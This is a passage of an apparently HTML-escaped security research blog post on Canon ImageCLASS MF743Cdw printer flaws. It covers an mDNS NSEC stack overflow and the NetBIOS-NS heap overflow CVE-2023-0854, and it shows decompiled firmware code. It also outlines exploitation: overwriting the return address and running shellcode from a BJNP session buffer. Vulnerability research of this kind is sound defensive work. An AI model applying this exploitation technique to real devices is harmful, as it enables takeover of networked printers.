      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When it is parsing the NSEC(type 47) record, it does not check the length of the record. It will copy the data to a local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, which leads to a stack buffer overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct an mDNS packet to trigger the stack overflow. It does not have Stack Guard, so we can overwrite the return address directly. It also does not implement DEP. We can overwrite the return address with a global buffer which we can control to run our shellcode.&lt;/p&gt;

&lt;p&gt;We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can run shellcode to do anything, such as modifying the website, changing the LCD screen, etc.&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;
&lt;p&gt;Ｗe found a heap overflow on NetBIOS. NetBIOS is a protocol for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. . Canon implemented the NetBIOS daemon by themselves.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;NetBIOS provides three distinct services:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) for name registration and resolution.&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) for connectionless communication.&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) for connection-oriented communication.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will focus on NetBIOS-NS (port 137).&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about NetBIOS-NS Packet Structure.&lt;/p&gt;

&lt;p&gt;NetBIOS-NS is based on the DNS packet format. It is defined in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; for both queries and responses. NetBIOS queries and responses utilize the NS header format defined in RFC1002 with exceptions noted below:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The query will be placed after the header. The first element is QNAME which is a domain name represented as a sequence of labels, where each label consists of a length character followed by that number of characters. Other element is not important in this vulnerability, so we won’t explain more here. More details can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the NetBIOS in NetBIOS packets, there is a heap overflow. The vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function. We can trigger it from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When NetBIOS service starts, it will initial &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt;. The buffer would be allocated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xff&lt;/code&gt; bytes from the heap.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When parsing the NetBIOS-NS in NetBIOS packets, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt; to process it.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
